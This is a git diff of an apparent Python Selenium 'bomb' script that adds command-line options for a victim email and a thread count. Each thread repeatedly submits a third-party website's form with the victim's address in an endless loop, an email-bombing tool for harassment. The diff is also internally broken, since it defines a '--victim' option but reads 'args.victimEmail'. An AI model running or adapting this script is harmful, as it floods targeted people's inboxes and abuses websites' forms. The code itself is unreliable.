@@ -2,11 +2,19 @@
 # -*- coding: utf-8 -*
 
 from selenium import webdriver
-import time
 import threading
+import argparse
+import time
 
-victim_email = ""
-threads = 4
+parser = argparse.ArgumentParser(description='Use example: python bomb.py -e <email to spam> -t <amount of threads>')
+parser.add_argument('-v', '--victim',
+                    type=str,
+                    help='Enter victim email')
+parser.add_argument('-t', '--threads',
+                    type=int,
+                    default=4,
+                    help='Enter amount of threads (4 is set by default)')
+args = parser.parse_args()
 
 
 def spam():
@@ -20,7 +28,7 @@ def spam():
 
     # fill email and password
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(victim_email)
+    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(args.victimEmail)
     driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys('John Doe')
 
     # make some clicks to send things to server
@@ -38,14 +46,14 @@ def spam():
 
     # enter email
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(victim_email)
+    driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(args.victimEmail)
 
     while True:
         # click submit button
         driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[2]/button').click()
 
 
-for k in range(threads):
-    k = threading.Thread(target=spam)
-    k.start()
+for k in range(args.threads):
+    thread = threading.Thread(target=spam)
+    thread.start()
     time.sleep(1)
